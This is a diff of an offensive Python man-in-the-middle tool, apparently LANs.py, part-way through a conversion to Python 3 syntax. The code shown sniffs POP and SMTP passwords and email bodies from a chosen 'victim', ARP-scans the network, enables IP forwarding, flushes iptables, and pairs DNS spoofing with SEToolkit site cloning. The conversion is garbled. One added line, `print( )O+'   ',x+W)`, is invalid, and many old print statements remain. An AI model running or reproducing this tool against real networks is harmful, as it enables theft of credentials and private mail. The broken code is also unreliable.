@@ -597,6 +597,7 @@ class Parser():
                         self.POPauth = 0
                         self.POPdest = ''
                         return
+                
                 print(R+'[!] POP user and pass found: '+load+W)
                 logger.write('[!] POP user and pass found: '+load+'\n')
                 self.mail_passwds.append(load)
@@ -607,6 +608,7 @@ class Parser():
             if 'AUTH PLAIN' in load:
                 self.POPauth = 1
                 self.POPdest = IP_dst
+        
         if dport == 26:
             if 'AUTH PLAIN ' in load:
                 # Don't double output mail passwords
@@ -615,7 +617,7 @@ class Parser():
                         self.POPauth = 0
                         self.POPdest = ''
                         return
-                print R+'[!] Mail authentication found: '+load+W
+                print(R+'[!] Mail authentication found: '+load+W)
                 logger.write('[!] Mail authentication found: '+load+'\n')
                 self.mail_passwds.append(load)
                 self.decode(load, dport)
@@ -626,15 +628,17 @@ class Parser():
                 for x in email_headers:
                     if x in l:
                         self.OheadersFound.append(l)
+            
             # if date, from, to, in headers then print the message
             if len(self.OheadersFound) > 3 and body != '':
                 if self.mailfragged == 1:
-                    print O+'[!] OUTGOING MESSAGE (fragmented)'+W
+                    print(O+'[!] OUTGOING MESSAGE (fragmented)'+W)
                     logger.write('[!] OUTGOING MESSAGE (fragmented)\n')
                     for x in self.OheadersFound:
-                        print O+'   ',x+W
+                        print( )O+'   ',x+W)
                         logger.write('  '+x+'\n')
-                    print O+'   Message:',body+W
+            
+                    print(O+'   Message:',body+W)
                     logger.write('  Message:'+body+'\n')
                 else:
                     print O+'[!] OUTGOING MESSAGE'+W
@@ -653,6 +657,7 @@ class Parser():
             for x in email_headers:
                 if x in l:
                     self.IheadersFound.append(l)
+        
         if len(self.IheadersFound) > 3 and body != '':
             if "BODY[TEXT]" not in body:
                 try:
@@ -721,12 +726,16 @@ class Queued(object):
         reactor.addReader(self)
         self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
         print '[*] Flushed firewall and forwarded traffic to the queue; waiting for data'
+    
     def fileno(self):
         return self.q.get_fd()
+    
     def doRead(self):
         self.q.process_pending(20)
+    
     def connectionLost(self, reason):
         reactor.removeReader(self)
+    
     def logPrefix(self):
         return 'queued'
 
@@ -740,44 +749,51 @@ class active_users():
     def pkt_cb(self, pkt):
         if pkt.haslayer(Dot11):
             pkt = pkt[Dot11]
+            
             if pkt.type == 2:
                 addresses = [pkt.addr1.upper(), pkt.addr2.upper(), pkt.addr3.upper()]
+                
                 for x in addresses:
                     for y in self.IPandMAC:
                         if x in y[1]:
                             y[2] = y[2]+1
                 self.current_time = time.time()
+    
             if self.current_time > self.start_time+1:
                 self.IPandMAC.sort(key=lambda x: float(x[2]), reverse=True) # sort by data packets
                 os.system('/usr/bin/clear')
-                print '    IP           Data'
+                print('    IP           Data')
+    
                 for x in self.IPandMAC:
                     if len(x) == 3:
                         ip = x[0].ljust(10)
                         data = str(x[2]).rjust(8)
-                        print ip, data
+                        print(ip, data)
                     else:
                         ip = x[0].ljust(10)
                         data = str(x[2]).rjust(8)
-                        print ip, data, x[3]
-                print '\n[*] Hit Ctrl-C at any time to stop and choose a victim IP'
+                        print(ip, data, x[3])
+                print('\n[*] Hit Ctrl-C at any time to stop and choose a victim IP')
                 self.start_time = time.time()
 
     def users(self, IPprefix, routerIP):
 
-        print '[*] Running ARP scan to identify users on the network; this may take a minute...'
+        print('[*] Running ARP scan to identify users on the network; this may take a minute...')
         iplist = []
         maclist = []
+    
         try:
             nmap = Popen(['/usr/bin/nmap', '-sn', IPprefix], stdout=PIPE, stderr=DN)
             nmap = nmap.communicate()[0]
             nmap = nmap.splitlines()[2:-1]
         except:
             print '[-] Nmap ARP scan failed, is it nmap installed?'
+    
         for x in nmap:
             if 'Nmap' in x:
                 nmapip = x.split()[4]
                 iplist.append(nmapip)
+            
             if 'MAC' in x:
                 nmapmac = x.split()[2]
                 maclist.append(nmapmac)
@@ -788,6 +804,7 @@ class active_users():
         r = 0
         for i in self.IPandMAC:
             i.append(0)
+            
             if r == 0:
                 if routerIP == i[0]:
                     i.append('router')
@@ -797,21 +814,23 @@ class active_users():
             exit('[-] Router MAC not found. Exiting.')
 
         # Do nbtscan for windows netbios names
-        print '[*] Running nbtscan to get Windows netbios names'
+        print('[*] Running nbtscan to get Windows netbios names')
         try:
             nbt = Popen(['nbtscan', IPprefix], stdout=PIPE, stderr=DN)
             nbt = nbt.communicate()[0]
             nbt = nbt.splitlines()
             nbt = nbt[4:]
         except:
-            print '[-] nbtscan error, are you sure it is installed?'
+            print('[-] nbtscan error, are you sure it is installed?')
+        
         for l in nbt:
             try:
                 l = l.split()
                 nbtip = l[0]
                 nbtname = l[1]
             except:
-                print '[-] Could not find any netbios names. Continuing without them'
+                print('[-] Could not find any netbios names. Continuing without them')
+            
             if nbtip and nbtname:
                 for a in self.IPandMAC:
                     if nbtip in a[0]:
@@ -824,7 +843,7 @@ class active_users():
             promisc = promiscSearch.communicate()[0]
             monmodeSearch = re.search('monitor mode enabled on (.+)\)', promisc)
             self.monmode = monmodeSearch.group(1)
-        except OSError, e:
+        except OSError as e:
             exit('[-] Enabling monitor mode failed, do you have aircrack-ng installed?')
 
         sniff(iface=self.monmode, prn=self.pkt_cb, store=0)
@@ -848,7 +867,8 @@ def setup(victimMAC):
         ipf = open('/proc/sys/net/ipv4/ip_forward', 'r+')
         ipf.write('1\n')
         ipf.close()
-        print '[*] Enabled IP forwarding'
+        print('[*] Enabled IP forwarding')
+
     os.system('/sbin/iptables -F')
     os.system('/sbin/iptables -X')
     os.system('/sbin/iptables -t nat -F')
@@ -875,8 +895,10 @@ def threads():
 
     if args.dnsspoof and not args.setoolkit:
         setoolkit = raw_input('[*] You are DNS spoofing '+args.dnsspoof+', would you like to start the Social Engineer\'s Toolkit for easy exploitation? [y/n]: ')
+ 
         if setoolkit == 'y':
             print '[*] Starting SEtoolkit. To clone '+args.dnsspoof+' hit options 1, 2, 3, 2, then enter '+args.dnsspoof
+ 
             try:
                 se = Thread(target=os.system, args=('/usr/bin/xterm -e /usr/bin/setoolkit >/dev/null 2>&1',))
                 se.daemon = True
@@ -885,16 +907,16 @@ def threads():
                 print '[-] Could not open SEToolkit, is it installed? Continuing as normal without it.'
 
     if args.nmapaggressive:
-        print '[*] Starting '+R+'aggressive scan [nmap -T4 -A -v -Pn -oN '+victimIP+']'+W+' in background; results will be in a file '+victimIP+'.nmap.txt'
+        print('[*] Starting '+R+'aggressive scan [nmap -T4 -A -v -Pn -oN '+victimIP+']'+W+' in background; results will be in a file '+victimIP+'.nmap.txt')
         try:
             n = Thread(target=os.system, args=('nmap -T4 -A -v -Pn -oN '+victimIP+'.nmap.txt '+victimIP+' >/dev/null 2>&1',))
             n.daemon = True
             n.start()
         except:
-            print '[-] Aggressive Nmap scan failed, is nmap installed?'
+            print('[-] Aggressive Nmap scan failed, is nmap installed?')
 
     if args.setoolkit:
-        print '[*] Starting SEtoolkit'
+        print('[*] Starting SEtoolkit')
         try:
             se = Thread(target=os.system, args=('/usr/bin/xterm -e /usr/bin/setoolkit >/dev/null 2>&1',))
             se.daemon = True
@@ -905,13 +927,16 @@ def threads():
 def pcap_handler():
     global victimIP
     bad_args = [args.dnsspoof, args.beef, args.code, args.nmap, args.nmapaggressive, args.driftnet, args.interface]
+    
     for x in bad_args:
         if x:
             sys.exit('[-] When reading from pcap file you may only include the following arguments: -v, -u, -p, -pcap [pcap filename], and -ip [victim IP address]')
+    
     if args.pcap:
         if args.ipaddress:
             victimIP = args.ipaddress
             pcap = rdpcap(args.pcap)
+    
             for payload in pcap:
                 Parser().start(payload)
             sys.exit('[-] Finished parsing pcap file')
@@ -938,6 +963,7 @@ def main():
     ipr = repr(ipr).split(' ')
     routerIP = ipr[2]
     IPprefix = ipr[8][2:]
+    
     if args.interface:
         interface = args.interface
     else:
@@ -948,11 +974,11 @@ def main():
     else:
         au = active_users()
         au.users(IPprefix, routerIP)
-        print '\n[*] Turning off monitor mode'
+        print('\n[*] Turning off monitor mode')
         os.system('/usr/sbin/airmon-ng stop %s >/dev/null 2>&1' % au.monmode)
         victimIP = raw_input('[*] Enter the non-router IP to spoof: ')
 
-    print "[*] Checking the DHCP and DNS server addresses..."
+    print("[*] Checking the DHCP and DNS server addresses...")
     # DHCP is a pain in the ass to craft
     dhcp = (Ether(dst='ff:ff:ff:ff:ff:ff')/
             IP(src="0.0.0.0",dst="255.255.255.255")/
@@ -965,6 +991,7 @@ def main():
                 chr(DHCPRevOptions["server_id"][0]),
                 chr(DHCPRevOptions["name_server"][0]),
                 ), "end"]))
+    
     ans, unans = srp(dhcp, timeout=6, retry=1)
     if ans:
         for s,r in ans:
@@ -979,7 +1006,7 @@ def main():
                 if 'name_server' in x:
                     dnsIP = x[1]
     else:
-        print "[-] No answer to DHCP packet sent to find the DNS server. Setting DNS and DHCP server to router IP."
+        print("[-] No answer to DHCP packet sent to find the DNS server. Setting DNS and DHCP server to router IP.")
         dnsIP = routerIP
         DHCPsrvr = routerIP
         local_domain = 'None'
@@ -988,22 +1015,25 @@ def main():
     print_vars(DHCPsrvr, dnsIP, local_domain, routerIP, victimIP)
     try:
         routerMAC = Spoof().originalMAC(routerIP)
-        print "[*] Router MAC: " + routerMAC
+        print("[*] Router MAC: " + routerMAC)
         logger.write("[*] Router MAC: "+routerMAC+'\n')
     except:
         exit("[-] Could not get router MAC address")
+    
     try:
         victimMAC = Spoof().originalMAC(victimIP)
-        print "[*] Victim MAC: " + victimMAC
+        print("[*] Victim MAC: " + victimMAC)
         logger.write("[*] Victim MAC: "+routerMAC+'\n')
     except:
         exit("[-] Could not get victim MAC address")
+    
     if dnsIP != routerIP:
         try:
             dnsMAC = Spoof().originalMAC(dnsIP)
-            print "[*] DNS server MAC: " + dnsMAC
+            print("[*] DNS server MAC: " + dnsMAC)
         except:
-            print "[-] Could not get DNS server MAC address"
+            print("[-] Could not get DNS server MAC address")
+    
     if dnsIP == routerIP:
         dnsMAC = routerMAC
 
@@ -1012,7 +1042,7 @@ def main():
     threads()
 
     if args.nmap:
-        print "\n[*] Running [nmap -T4 -O "+victimIP+"]"
+        print("\n[*] Running [nmap -T4 -O "+victimIP+"]")
         try:
             nmap = Popen(['/usr/bin/nmap', '-T4', '-O', victimIP], stdout=PIPE, stderr=DN)
             nmap = nmap.communicate()[0]
